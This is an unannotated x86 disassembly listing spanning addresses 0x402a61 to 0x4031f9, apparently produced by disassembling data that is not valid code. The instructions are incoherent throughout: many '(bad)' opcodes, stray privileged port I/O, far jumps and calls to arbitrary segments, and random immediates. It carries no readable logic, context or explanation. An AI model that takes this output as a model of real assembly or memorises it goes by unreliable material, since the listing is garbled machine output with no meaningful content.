  402a61:	inc    edi
  402a62:	fstp   TBYTE PTR fs:[ebp-0x1a]
  402a66:	push   0xa9e8c5f6
  402a6b:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  402a6d:	(bad)  
  402a6e:	push   ds
  402a6f:	ds jnp 0x402a32
  402a72:	dec    BYTE PTR [esi+0x66c77b2]
  402a78:	cmp    DWORD PTR [ecx],ebp
  402a7a:	out    0xec,al
  402a7c:	and    eax,0xdd096a81
  402a81:	mov    edx,0xf6b81465
  402a86:	mov    esp,0x5c1621d0
  402a8b:	mov    ebp,0xaca7f8d9
  402a90:	test   eax,0xd65c776d
  402a95:	mov    al,ds:0x815639f3
  402a9a:	mov    bh,BYTE PTR [edx]
  402a9c:	pop    ss
  402a9d:	test   eax,0xae2e2de5
  402aa2:	mov    ecx,0xbd58fffe
  402aa7:	stc    
  402aa8:	scas   al,BYTE PTR es:[edi]
  402aa9:	adc    bl,BYTE PTR [ebx]
  402aab:	sti    
  402aac:	ds and esi,ebx
  402aaf:	jge    0x402a60
  402ab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ab2:	(bad)  
  402ab3:	cdq    
  402ab4:	xchg   DWORD PTR [ebx],ebx
  402ab6:	or     bl,ah
  402ab8:	xor    BYTE PTR [eax],al
  402aba:	stos   DWORD PTR es:[edi],eax
  402abb:	pushf  
  402abc:	inc    ebx
  402abd:	sub    DWORD PTR [ebx-0x3686327e],ecx
  402ac3:	loope  0x402b40
  402ac5:	and    BYTE PTR [edi],ch
  402ac7:	dec    ebp
  402ac8:	data16 adc ah,bh
  402acb:	sbb    ch,BYTE PTR [eax+0x4]
  402ace:	pop    ebx
  402acf:	add    BYTE PTR [ebp-0x87df05],al
  402ad5:	push   cs
  402ad6:	or     bh,BYTE PTR [ebx+0x57]
  402ad9:	nop
  402ada:	ins    DWORD PTR es:[edi],dx
  402adb:	add    eax,0x53a80d67
  402ae0:	scas   eax,DWORD PTR es:[edi]
  402ae1:	popf   
  402ae2:	pop    eax
  402ae3:	adc    esi,DWORD PTR [ebx-0x48]
  402ae6:	nop
  402ae7:	int3   
  402ae8:	pop    es
  402ae9:	dec    eax
  402aea:	mov    edx,0x2b04b4a3
  402af0:	vcmpps xmm1,xmm5,xmm3,0x8d
  402af5:	jno    0x402b6f
  402af7:	lds    edx,FWORD PTR [eax]
  402af9:	fcom   DWORD PTR [ebp-0x11d59ba7]
  402aff:	push   esi
  402b00:	retf   0xdad8
  402b03:	jns    0x402a85
  402b05:	xchg   al,dl
  402b07:	in     al,0x5b
  402b09:	out    0xd5,eax
  402b0b:	jmp    0xaf05:0x5516b8c8
  402b12:	aas    
  402b13:	pop    es
  402b14:	mov    ah,0x76
  402b16:	xchg   edx,eax
  402b17:	adc    DWORD PTR [ebx+eax*2-0x5b65c54a],ebp
  402b1e:	push   0x6f
  402b20:	xchg   esp,eax
  402b21:	stos   DWORD PTR es:[edi],eax
  402b22:	cli    
  402b23:	cmp    DWORD PTR [esi+edi*4+0x2723261],esp
  402b2a:	loopne 0x402adc
  402b2c:	sbb    bh,0x12
  402b2f:	(bad)  
  402b30:	pusha  
  402b31:	into   
  402b32:	adc    BYTE PTR [edx],cl
  402b34:	popa   
  402b35:	xor    edi,0xffffffd6
  402b38:	push   es
  402b39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b3a:	xchg   edx,eax
  402b3b:	push   0xffffffb4
  402b3d:	adc    ecx,esi
  402b3f:	(bad)  [ebx]
  402b41:	jmp    0x45c2638d
  402b46:	add    ch,dh
  402b48:	in     eax,dx
  402b49:	aaa    
  402b4a:	jge    0x402bbc
  402b4c:	jl     0x402b8a
  402b4e:	test   al,0x46
  402b50:	xor    DWORD PTR [eax-0x3e3a6961],esi
  402b56:	jp     0x402b22
  402b58:	dec    edx
  402b59:	mov    ds:0xc7572c1c,eax
  402b5e:	inc    edx
  402b5f:	lock fwait
  402b61:	mov    eax,ds:0x9fed32e3
  402b66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b67:	ins    DWORD PTR es:[edi],dx
  402b68:	adc    edi,eax
  402b6a:	pop    ds
  402b6b:	sub    ch,BYTE PTR [edx]
  402b6d:	mov    edi,0xebad9a95
  402b72:	mov    ah,0xe7
  402b74:	xor    dh,bl
  402b76:	(bad)  
  402b77:	cmp    al,0xde
  402b79:	jno    0x402bbe
  402b7b:	pop    ds
  402b7c:	nop
  402b7d:	and    al,0x61
  402b7f:	or     BYTE PTR [esp+esi*4],dh
  402b82:	inc    ebx
  402b83:	mov    eax,ds:0x8fc1c4f0
  402b88:	xchg   esi,eax
  402b89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b8a:	lods   eax,DWORD PTR ds:[esi]
  402b8b:	cdq    
  402b8c:	pop    ebx
  402b8d:	ror    DWORD PTR [ecx+esi*8-0x6c],cl
  402b91:	pop    eax
  402b92:	call   0x15ce:0x5c78374
  402b99:	mov    dl,0xda
  402b9b:	loopne 0x402b2b
  402b9d:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  402b9f:	cdq    
  402ba0:	xchg   ebp,eax
  402ba1:	cmc    
  402ba2:	sbb    eax,0x26fc1e6b
  402ba7:	sub    eax,DWORD PTR [esi+0x18a23714]
  402bad:	dec    edx
  402bae:	mov    ah,0x8c
  402bb0:	(bad)  
  402bb1:	lahf   
  402bb2:	push   es
  402bb3:	dec    eax
  402bb4:	imul   esp,DWORD PTR [eax-0x6d4cf0c3],0xffffff8c
  402bbb:	pop    edx
  402bbc:	fidiv  WORD PTR [edi-0x7fdb795f]
  402bc2:	jmp    0x402c38
  402bc4:	cmp    al,0xb6
  402bc6:	retf   0x9c2f
  402bc9:	pop    esp
  402bca:	and    DWORD PTR ds:0xb5eb71bd,0xb3f454f3
  402bd4:	bound  eax,QWORD PTR [esi]
  402bd6:	push   ds
  402bd7:	ror    dh,1
  402bd9:	and    al,0x7b
  402bdb:	stc    
  402bdc:	jge    0x402c5c
  402bde:	ins    DWORD PTR es:[edi],dx
  402bdf:	retf   
  402be0:	ret    0xd032
  402be3:	ror    DWORD PTR [edx],1
  402be5:	or     eax,0x51b125b9
  402bea:	sub    esi,DWORD PTR [edx]
  402bec:	(bad)
  402bf0:	mov    al,0xe7
  402bf2:	sti    
  402bf3:	mov    ds:0x8f97642f,eax
  402bf8:	sub    eax,DWORD PTR [esi+0x1d]
  402bfb:	repz aaa 
  402bfd:	or     ecx,eax
  402bff:	imul   esi,DWORD PTR [ebp-0x60],0xffffffe2
  402c03:	(bad)  
  402c04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c05:	add    DWORD PTR [edi-0x57],eax
  402c08:	(bad)  
  402c0b:	test   al,0x78
  402c0d:	and    DWORD PTR ss:[edi-0x67870797],ebp
  402c14:	inc    ebp
  402c15:	inc    ecx
  402c16:	jns    0x402bc1
  402c18:	mov    ebx,0x9ce60f96
  402c1d:	outs   dx,BYTE PTR ds:[esi]
  402c1e:	xchg   ecx,eax
  402c1f:	ins    DWORD PTR es:[edi],dx
  402c20:	cmp    bl,BYTE PTR [edx+0x5183b1a7]
  402c26:	enter  0x46d5,0x85
  402c2a:	mov    ds:0x32872d36,eax
  402c2f:	imul   ebx,DWORD PTR [esi+0x3dc78ba6],0xffffffd5
  402c36:	adc    DWORD PTR [ebp+0x1989550d],eax
  402c3c:	call   0x69cb:0x2d482554
  402c43:	xchg   ebx,eax
  402c44:	call   0x1a59:0x4850bc65
  402c4b:	in     eax,0x6
  402c4d:	hlt    
  402c4e:	sub    eax,ebp
  402c50:	dec    ebp
  402c51:	loope  0x402c2d
  402c53:	(bad)  
  402c54:	out    dx,eax
  402c55:	sbb    ch,BYTE PTR [ecx]
  402c57:	xor    esi,edx
  402c59:	fidiv  WORD PTR [esi+edi*2+0x11cba328]
  402c60:	cli    
  402c61:	push   es
  402c62:	ins    DWORD PTR es:[edi],dx
  402c63:	(bad)  
  402c64:	and    eax,0xcc3edeec
  402c69:	jle    0x402c91
  402c6b:	data16 xlat BYTE PTR ds:[ebx]
  402c6d:	outs   dx,DWORD PTR ds:[esi]
  402c6e:	stos   BYTE PTR es:[edi],al
  402c6f:	sti    
  402c70:	int3   
  402c71:	jle    0x402c6c
  402c73:	jecxz  0x402c65
  402c75:	mov    BYTE PTR [esi-0x28],ch
  402c78:	sub    BYTE PTR [edi],bl
  402c7a:	fld    QWORD PTR [ebx-0x63]
  402c7d:	and    al,0xa1
  402c7f:	sub    eax,DWORD PTR [edx+0x4dea1a64]
  402c85:	dec    edx
  402c86:	jb     0x402cf5
  402c88:	jb     0x402ce5
  402c8a:	push   ebx
  402c8b:	cmp    al,0x12
  402c8d:	sub    al,0x90
  402c8f:	push   ds
  402c90:	mov    cl,0xe1
  402c92:	mov    esp,0x4f4cadf7
  402c97:	mul    DWORD PTR ds:0x78cacef7
  402c9d:	jp     0x402d16
  402c9f:	xor    dl,BYTE PTR [edx+0x2]
  402ca2:	xor    ch,bh
  402ca4:	dec    ecx
  402ca5:	shr    BYTE PTR [ebp-0xe],0xbc
  402ca9:	cmp    al,0xa6
  402cab:	ret    
  402cac:	imul   ebp,DWORD PTR [esi+eiz*2+0x2d],0x1e720181
  402cb4:	ret    
  402cb5:	aas    
  402cb6:	mov    bl,0x0
  402cb8:	adc    DWORD PTR [ebx],0x48a61fc2
  402cbe:	dec    ebx
  402cbf:	add    ebp,ebp
  402cc1:	(bad)  
  402cc2:	xor    ah,ch
  402cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cc5:	mov    ds:0x41007cec,eax
  402cca:	push   es
  402ccb:	test   al,0xa6
  402ccd:	cmp    esp,DWORD PTR [ebx]
  402ccf:	lods   eax,DWORD PTR ds:[esi]
  402cd0:	jne    0x402c91
  402cd2:	je     0x402d15
  402cd4:	jne    0x402d41
  402cd6:	cdq    
  402cd7:	xchg   DWORD PTR [edi+0x2947571a],esi
  402cdd:	in     eax,0x6b
  402cdf:	int    0xf2
  402ce1:	clc    
  402ce2:	pop    esi
  402ce3:	ret    
  402ce4:	(bad)  
  402ce5:	out    dx,eax
  402ce6:	jmp    0xbd70:0xb428bd20
  402ced:	out    dx,eax
  402cee:	dec    ebp
  402cef:	jne    0x402c7a
  402cf1:	jle    0x402c93
  402cf3:	inc    ecx
  402cf4:	data16 fcomi st,st(7)
  402cf7:	mov    ah,0x8f
  402cf9:	aad    0x12
  402cfb:	and    ebx,0xffffffbe
  402cfe:	dec    bl
  402d00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d01:	neg    ecx
  402d03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d04:	and    al,0x3b
  402d06:	arpl   WORD PTR [ebx+0x54],si
  402d09:	das    
  402d0a:	inc    edx
  402d0b:	push   cs
  402d0c:	mov    edx,0x27353b50
  402d11:	dec    ebp
  402d12:	inc    ebx
  402d13:	aas    
  402d14:	(bad)  
  402d15:	fwait
  402d16:	add    ebp,DWORD PTR [edi+edi*2]
  402d19:	repnz xor dl,dh
  402d1c:	adc    bl,ch
  402d1e:	adc    esp,DWORD PTR [edx]
  402d20:	retf   0x14c9
  402d23:	sub    eax,0x1bd9264f
  402d28:	mov    WORD PTR [eax-0xf],es
  402d2b:	mov    al,ds:0x9a63ce38
  402d30:	add    ebx,DWORD PTR [edx+ecx*4]
  402d33:	pushf  
  402d34:	or     DWORD PTR [eax-0x3d5153f9],edx
  402d3a:	xchg   BYTE PTR [edi+0x322c30d6],al
  402d40:	jmp    0x53f8:0x5e816108
  402d47:	test   BYTE PTR es:[esi-0x284c89d3],ah
  402d4e:	mov    dl,0xb6
  402d50:	xchg   edx,eax
  402d51:	arpl   WORD PTR [ebp+0x64],di
  402d54:	je     0x402ce8
  402d56:	sbb    dl,al
  402d58:	pop    ebp
  402d59:	(bad)  
  402d5b:	sub    DWORD PTR [ecx+0x7bef4f88],edi
  402d61:	cmp    dl,bl
  402d63:	shl    DWORD PTR [eax],cl
  402d65:	cld    
  402d66:	or     ebp,DWORD PTR [edx+0x13fdd03f]
  402d6c:	add    ch,BYTE PTR [edx+0x64a2a4d8]
  402d72:	scas   al,BYTE PTR es:[edi]
  402d73:	or     DWORD PTR [esi+0x1d3c5a34],eax
  402d79:	stos   BYTE PTR es:[edi],al
  402d7a:	mov    BYTE PTR [ecx+0x54],dh
  402d7d:	mov    dl,0xc4
  402d7f:	cmp    eax,0xcfcba6ad
  402d84:	and    cl,bh
  402d86:	cmp    eax,0x6071b3cb
  402d8b:	cmp    eax,0x4a94f963
  402d90:	cmp    esi,DWORD PTR [ecx-0x53]
  402d93:	push   ss
  402d94:	push   eax
  402d95:	lods   al,BYTE PTR ds:[esi]
  402d96:	mov    dh,0x4c
  402d98:	mov    eax,ds:0xea2f66b1
  402d9d:	push   edi
  402d9e:	les    edi,FWORD PTR [ecx+0x5f41361e]
  402da4:	sti    
  402da5:	dec    edi
  402da6:	cmp    dl,dl
  402da8:	add    BYTE PTR [ecx+0x25],dh
  402dab:	cwde   
  402dac:	enter  0x1dd9,0xae
  402db0:	inc    eax
  402db1:	sti    
  402db2:	add    edx,esi
  402db4:	call   edx
  402db6:	mov    esp,0xe66ff53a
  402dbb:	loop   0x402e14
  402dbd:	lea    ecx,[ecx]
  402dbf:	mov    esp,0xb0afc312
  402dc4:	pop    edx
  402dc5:	mov    dh,bl
  402dc7:	stos   BYTE PTR es:[edi],al
  402dc8:	xor    ah,bl
  402dca:	sub    al,0xed
  402dcc:	out    0xaf,al
  402dce:	lahf   
  402dcf:	scas   al,BYTE PTR es:[edi]
  402dd0:	sub    al,0x8c
  402dd2:	enter  0x3e4f,0xc9
  402dd6:	sbb    eax,0xb4620231
  402ddb:	arpl   WORD PTR [ecx-0xff087cb],sp
  402de1:	jl     0x402df2
  402de3:	(bad)  
  402de4:	in     al,0xc1
  402de6:	div    DWORD PTR [edx]
  402de8:	mov    al,0xeb
  402dea:	xchg   esi,eax
  402deb:	and    DWORD PTR [esi-0x26496b2e],esp
  402df1:	adc    eax,DWORD PTR [ecx-0x701b32d8]
  402df7:	loop   0x402db0
  402df9:	xchg   ecx,eax
  402dfa:	gs in  al,dx
  402dfc:	xor    esp,DWORD PTR [ecx-0x1c]
  402dff:	mov    es,WORD PTR [esi+0x77626d31]
  402e05:	gs stos DWORD PTR es:[edi],eax
  402e07:	repz fdiv QWORD PTR [ecx+ecx*4-0x5a9adf1d]
  402e0f:	or     DWORD PTR [ebp+0x17141b8c],0xffffff9b
  402e16:	xchg   esi,eax
  402e17:	loop   0x402e90
  402e19:	cmp    DWORD PTR [edx+0x56],0x367437ff
  402e20:	xchg   ecx,eax
  402e21:	mov    cl,0x53
  402e23:	sub    DWORD PTR [edi+0x10],esi
  402e26:	xchg   ecx,eax
  402e27:	sbb    cl,BYTE PTR [edi+0xca82652]
  402e2d:	(bad)  
  402e2f:	call   0x1ee706d7
  402e34:	shl    DWORD PTR [ebp+0x2bc0df61],0x94
  402e3b:	popf   
  402e3c:	or     eax,0xf387473a
  402e41:	cmp    ebx,DWORD PTR [esi]
  402e43:	push   ecx
  402e44:	aas    
  402e45:	ror    DWORD PTR [ecx],0x99
  402e48:	cmp    cl,al
  402e4a:	sti    
  402e4b:	dec    ebx
  402e4c:	push   esp
  402e4d:	outs   dx,DWORD PTR ds:[esi]
  402e4e:	int    0xc8
  402e50:	out    0x61,eax
  402e52:	aaa    
  402e53:	pop    eax
  402e54:	mov    al,ds:0x6a60dd22
  402e59:	mov    dh,0xf3
  402e5b:	cs in  eax,dx
  402e5d:	ror    DWORD PTR [ebx+edx*2],0x2a
  402e61:	xchg   edi,eax
  402e62:	jo     0x402e84
  402e64:	jmp    0x402e17
  402e66:	xor    cl,BYTE PTR es:[eax-0x78]
  402e6a:	xchg   ecx,eax
  402e6b:	pop    eax
  402e6c:	imul   esi,DWORD PTR fs:[ebx-0x46c7c74c],0xffffffa3
  402e74:	int    0xc4
  402e76:	jg     0x402ef1
  402e78:	mov    eax,0x73122a2
  402e7d:	lea    esp,[edi-0x19]
  402e80:	inc    ebp
  402e81:	cwde   
  402e82:	(bad)  
  402e83:	cdq    
  402e84:	mov    dl,0x2d
  402e86:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e88:	cmp    esi,DWORD PTR [esi+ebp*4+0x28]
  402e8c:	jmp    0xae39:0xe84b0267
  402e93:	xor    eax,0xf4faa223
  402e98:	push   0x13c890be
  402e9d:	inc    esi
  402e9e:	and    eax,0xf80570bf
  402ea3:	inc    ebp
  402ea4:	or     BYTE PTR [esp+eiz*4],ah
  402ea7:	cmp    eax,0xda3c8674
  402eac:	test   eax,ecx
  402eae:	or     DWORD PTR [ebp+0x40],0xcfadb554
  402eb5:	shr    BYTE PTR ds:0xb41b8cd3,cl
  402ebb:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ebd:	mov    ds:0x17e97d8d,eax
  402ec2:	inc    esp
  402ec3:	cmc    
  402ec4:	test   al,0xe8
  402ec6:	call   0xd3df2790
  402ecb:	sbb    eax,esi
  402ecd:	in     al,0xb
  402ecf:	in     al,dx
  402ed0:	xlat   BYTE PTR ds:[ebx]
  402ed1:	adc    bh,BYTE PTR [edx]
  402ed3:	cs push ebx
  402ed5:	lds    eax,FWORD PTR [eax]
  402ed7:	sbb    DWORD PTR [edx],ebp
  402ed9:	stos   DWORD PTR es:[edi],eax
  402eda:	pop    ecx
  402edb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402edc:	xchg   esp,eax
  402edd:	cwde   
  402ede:	popf   
  402edf:	repnz cwde 
  402ee1:	test   bh,bh
  402ee3:	test   dl,dh
  402ee5:	xor    eax,0x6cc29f59
  402eea:	sub    al,0xbd
  402eec:	(bad)  
  402eed:	mov    esp,0x8bd01110
  402ef2:	cmp    ah,BYTE PTR [eax+0x24]
  402ef5:	sub    eax,0x212e8750
  402efa:	mov    cl,0xd0
  402efc:	add    al,0x45
  402efe:	int3   
  402eff:	and    edi,DWORD PTR [ebx+0x272257b6]
  402f05:	fist   WORD PTR [eax]
  402f07:	sub    al,0xaf
  402f09:	rcl    BYTE PTR [ecx+ecx*2+0x45],0x5
  402f0e:	sbb    al,0xc
  402f10:	xchg   BYTE PTR [edx+0x2c],dh
  402f13:	inc    edi
  402f14:	fisubr WORD PTR [eax-0x19909657]
  402f1a:	dec    esi
  402f1b:	das    
  402f1c:	mov    ebx,0x3fc7567e
  402f21:	pop    esp
  402f22:	stos   BYTE PTR es:[edi],al
  402f23:	sub    ebx,DWORD PTR [ebx]
  402f25:	sub    edi,DWORD PTR [edx]
  402f27:	pop    es
  402f28:	fwait
  402f29:	sub    esi,DWORD PTR [edi]
  402f2b:	cdq    
  402f2c:	push   0xffffff8e
  402f2e:	mov    al,ds:0x3991b752
  402f33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f34:	cmp    al,0x59
  402f36:	leave  
  402f37:	push   0xffffffc7
  402f39:	les    ebp,FWORD PTR [esp+eiz*2+0x3e]
  402f3d:	sbb    DWORD PTR ds:0x7bbf95f8,edx
  402f43:	enter  0xda13,0xa3
  402f47:	cli    
  402f48:	xchg   ebx,eax
  402f49:	test   al,0x8f
  402f4b:	dec    eax
  402f4c:	inc    ebx
  402f4d:	adc    eax,0x4565e323
  402f52:	test   al,0x1
  402f54:	in     eax,dx
  402f55:	fld    TBYTE PTR [ebx-0x57]
  402f58:	sub    BYTE PTR [eax],dl
  402f5a:	xchg   edi,eax
  402f5b:	push   eax
  402f5c:	rcl    DWORD PTR [esp+edx*8-0x30],cl
  402f60:	xor    bl,BYTE PTR [edx+0x61f98c95]
  402f66:	add    edi,eax
  402f68:	fdiv   QWORD PTR [esi+0x3302b858]
  402f6e:	inc    edi
  402f6f:	cmp    ebp,DWORD PTR [edi-0x4f51247d]
  402f75:	into   
  402f76:	into   
  402f77:	in     al,dx
  402f78:	and    eax,esp
  402f7a:	mov    dh,0xbf
  402f7c:	lods   eax,DWORD PTR ds:[esi]
  402f7d:	add    bl,dh
  402f7f:	popa   
  402f80:	pop    es
  402f81:	pop    edi
  402f82:	ins    BYTE PTR es:[edi],dx
  402f83:	imul   esi,ebp,0xffffffe3
  402f86:	adc    BYTE PTR [ecx],dl
  402f88:	fs dec eax
  402f8a:	jns    0x402f35
  402f8c:	xchg   ebp,eax
  402f8d:	aas    
  402f8e:	inc    eax
  402f8f:	adc    bl,BYTE PTR [ebx+0x206db303]
  402f95:	aaa    
  402f96:	xor    bh,BYTE PTR [esi-0x60300fa6]
  402f9c:	sahf   
  402f9d:	repz pop edx
  402f9f:	cli    
  402fa0:	and    esp,DWORD PTR [esi]
  402fa2:	jae    0x402f3d
  402fa4:	or     BYTE PTR [edx+0x58e1b662],dl
  402faa:	ds xchg edi,eax
  402fac:	add    eax,0xbc711e0a
  402fb1:	es xchg esi,eax
  402fb3:	cli    
  402fb4:	xor    cl,BYTE PTR [edi]
  402fb6:	push   ss
  402fb7:	lds    edx,FWORD PTR [esi-0x4c]
  402fba:	fldenv [ecx+0x1f]
  402fbd:	int    0x51
  402fbf:	jae    0x402fc8
  402fc1:	(bad)  
  402fc2:	push   0x7568fb5b
  402fc7:	gs cli 
  402fc9:	jmp    0x403043
  402fcb:	xchg   esi,eax
  402fcc:	and    ch,dh
  402fce:	mov    bl,0xdd
  402fd0:	fistp  DWORD PTR [edx]
  402fd2:	aaa    
  402fd3:	(bad)  
  402fd4:	aad    0x96
  402fd6:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fd8:	shl    DWORD PTR [ebp+0x58c2755c],cl
  402fde:	sti    
  402fdf:	jg     0x40300d
  402fe1:	rcl    DWORD PTR [ecx+ebx*1-0x7f],0xe1
  402fe6:	mov    eax,0x48d2f437
  402feb:	popa   
  402fec:	adc    cl,bh
  402fee:	enter  0xe0f3,0x99
  402ff2:	jno    0x402faf
  402ff4:	or     al,0xf5
  402ff6:	xor    BYTE PTR [eax-0x64],0x5a
  402ffa:	sbb    DWORD PTR [edi-0x8095233],0x27897d1c
  403004:	jne    0x402fb7
  403006:	scas   eax,DWORD PTR es:[edi]
  403007:	and    DWORD PTR [edi+0x2f],ecx
  40300a:	and    ch,dh
  40300c:	dec    esp
  40300d:	jg     0x402fcf
  40300f:	out    0xf6,al
  403011:	imul   ecx,esp,0xffffffb3
  403014:	imul   ebp,DWORD PTR [edi-0x723c6e37],0xfffffff6
  40301b:	mov    BYTE PTR [esi-0x1b],bl
  40301e:	dec    esi
  40301f:	pop    edi
  403020:	cmp    al,0xd8
  403022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403023:	ret    
  403024:	fldenv [ebp-0xa]
  403027:	aad    0x83
  403029:	dec    ebp
  40302a:	adc    al,al
  40302c:	mov    WORD PTR [edi],ss
  40302e:	cdq    
  40302f:	lock fnsave [ebp-0x6]
  403033:	setge  BYTE PTR [ebx+0x53312be]
  40303a:	mul    al
  40303c:	(bad)  
  40303d:	pop    esp
  40303e:	and    DWORD PTR [ebx+0x65bab4e1],0xffffff9e
  403045:	iret   
  403046:	cmc    
  403047:	ret    
  403048:	addr16 mov edi,0x544a6467
  40304e:	mov    eax,0xd2a611ed
  403053:	psubq  mm2,QWORD PTR [esi]
  403056:	imul   esi,DWORD PTR [ebx+0x16],0x9436a1af
  40305d:	test   DWORD PTR [edi-0x1c147762],esp
  403063:	into   
  403064:	push   cs
  403065:	ficomp WORD PTR [ecx+ebx*8]
  403068:	xor    ebx,0xffffff88
  40306b:	(bad)  
  40306c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40306d:	and    dl,cl
  40306f:	or     DWORD PTR [edx+0x1f],ecx
  403072:	adc    eax,0xe3557ca6
  403077:	sbb    DWORD PTR [ecx+0x63],0x7e
  40307b:	js     0x403042
  40307d:	xor    eax,0x44dc7455
  403082:	arpl   WORD PTR [edx+0x6e],cx
  403085:	add    ah,BYTE PTR [ebx+0x31]
  403088:	jno    0x4030a0
  40308a:	xchg   BYTE PTR [eax+0x56],bl
  40308d:	mov    eax,0x8b08f617
  403092:	test   esi,ebp
  403094:	fisttp WORD PTR [esi-0x37]
  403097:	(bad)  
  403098:	jb     0x403055
  40309a:	das    
  40309b:	mov    al,ds:0xd333a75e
  4030a0:	dec    ecx
  4030a1:	lods   eax,DWORD PTR ds:[esi]
  4030a2:	cmp    dl,ah
  4030a4:	lods   al,BYTE PTR ds:[esi]
  4030a5:	mov    ch,0x3b
  4030a7:	sbb    ah,ch
  4030a9:	xchg   ebp,eax
  4030aa:	inc    esi
  4030ab:	sub    eax,0x457a278
  4030b0:	mov    ebx,0x5e6b2f7f
  4030b5:	cmp    DWORD PTR [ebx+ebp*2],esp
  4030b8:	and    ah,BYTE PTR [eax]
  4030ba:	inc    ebp
  4030bb:	sbb    DWORD PTR [esi-0x18d8cb92],edi
  4030c1:	jp     0x4030cb
  4030c3:	jl     0x40312d
  4030c5:	push   edx
  4030c6:	das    
  4030c7:	xor    eax,DWORD PTR [ecx-0x1a1a4c15]
  4030cd:	sub    al,0x8a
  4030cf:	adc    eax,0x273fc97
  4030d4:	inc    esp
  4030d5:	icebp  
  4030d6:	mov    dl,0x41
  4030d8:	pop    edi
  4030d9:	cmp    eax,0xfd8f2ec
  4030de:	outs   dx,BYTE PTR ds:[esi]
  4030df:	xor    dh,BYTE PTR [esi-0x69d1a388]
  4030e5:	push   ecx
  4030e6:	iret   
  4030e7:	xor    eax,0x1b30b2b5
  4030ec:	fcmovnu st,st(5)
  4030ee:	sub    al,0x2a
  4030f0:	dec    ebp
  4030f1:	sar    bh,cl
  4030f3:	ss xchg edi,eax
  4030f5:	ds sti 
  4030f7:	xor    ecx,DWORD PTR [ebp+0x12a6f36f]
  4030fd:	jbe    0x40311f
  4030ff:	gs xchg esi,eax
  403101:	in     eax,dx
  403102:	push   0xfffffff4
  403104:	rol    BYTE PTR [edx+0x5e],1
  403107:	cmp    edi,esp
  403109:	pusha  
  40310a:	ucomiss xmm3,DWORD PTR [ebx-0x1727d61e]
  403111:	dec    eax
  403112:	loop   0x403156
  403114:	or     DWORD PTR [ecx-0x189de779],ebx
  40311a:	push   esi
  40311b:	sub    al,BYTE PTR [ebx-0x1]
  40311e:	pop    edi
  40311f:	ja     0x4030bc
  403121:	ins    BYTE PTR es:[edi],dx
  403122:	ss jmp 0xe1d5:0x1c956da9
  40312a:	rcl    DWORD PTR [ebx+0x3],1
  40312d:	in     al,dx
  40312e:	repz sbb al,0xea
  403131:	fistp  DWORD PTR [edi-0x5b]
  403134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403135:	leave  
  403136:	mov    al,0x13
  403138:	mov    ds:0x71f53fb5,eax
  40313d:	(bad)  
  40313e:	xor    eax,0x3e386a77
  403143:	and    ecx,edi
  403145:	dec    edx
  403146:	ror    ecx,cl
  403148:	sub    BYTE PTR [eax-0x230b5741],dh
  40314e:	mov    eax,ds:0xa825d449
  403153:	out    dx,al
  403154:	test   al,0xb4
  403156:	pop    ss
  403157:	and    al,0x52
  403159:	js     0x403159
  40315b:	ja     0x403194
  40315d:	ret    0x7b
  403160:	cmp    BYTE PTR [eax-0x32],al
  403163:	inc    ebp
  403164:	sub    al,0x21
  403166:	pop    ecx
  403167:	jle    0x4031b5
  403169:	jmp    FWORD PTR [ecx]
  40316b:	and    DWORD PTR [ecx+0x78cfff25],ebx
  403171:	lahf   
  403172:	imul   esi,DWORD PTR [ebp-0xdc935aa],0xb0fc4dc1
  40317c:	mov    ds:0x6fbb13,al
  403181:	(bad)  
  403182:	fsubr  DWORD PTR [esi]
  403184:	(bad)  
  403185:	repz xchg ebp,eax
  403187:	mov    eax,0x79682853
  40318c:	ins    BYTE PTR es:[edi],dx
  40318d:	add    eax,0xca430263
  403192:	cwde   
  403193:	icebp  
  403194:	add    al,0x51
  403196:	jo     0x40313f
  403198:	scas   al,BYTE PTR es:[edi]
  403199:	mov    al,0xbf
  40319b:	mov    ah,0x19
  40319d:	outs   dx,DWORD PTR ds:[esi]
  40319e:	adc    ch,0xb4
  4031a1:	out    dx,eax
  4031a2:	pop    eax
  4031a3:	mov    BYTE PTR [esi+0x155d9d3f],0xca
  4031aa:	fdivp  st(6),st
  4031ac:	(bad)  
  4031ae:	cmc    
  4031af:	xchg   edx,eax
  4031b0:	outs   dx,DWORD PTR es:[esi]
  4031b2:	inc    ebp
  4031b3:	sahf   
  4031b4:	xor    BYTE PTR [esp+eiz*2],0x4a
  4031b8:	adc    ch,bh
  4031ba:	sub    eax,0x44c41778
  4031bf:	pop    edx
  4031c0:	fxch   st(3)
  4031c2:	inc    eax
  4031c3:	fnstenv [edx-0x16]
  4031c6:	ds jmp 0xc4ef:0xf3ab709c
  4031ce:	pusha  
  4031cf:	retf   
  4031d0:	mov    ch,0x5a
  4031d2:	addr16 sub al,0x2e
  4031d5:	(bad)  
  4031d6:	mov    cl,0xd9
  4031d8:	cli    
  4031d9:	(bad)  
  4031da:	pop    ebp
  4031db:	stc    
  4031dc:	mov    edx,0x387dda3d
  4031e1:	xchg   esi,eax
  4031e2:	sbb    DWORD PTR [ebx],ecx
  4031e4:	mov    ah,0x36
  4031e6:	in     al,dx
  4031e7:	daa    
  4031e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031e9:	sar    bl,cl
  4031eb:	fwait
  4031ec:	push   esp
  4031ed:	mov    edx,0x14d5cb21
  4031f2:	add    DWORD PTR [edi],esp
  4031f4:	push   ebx
  4031f5:	adc    al,BYTE PTR [edi]
  4031f7:	add    al,0xe4
  4031f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
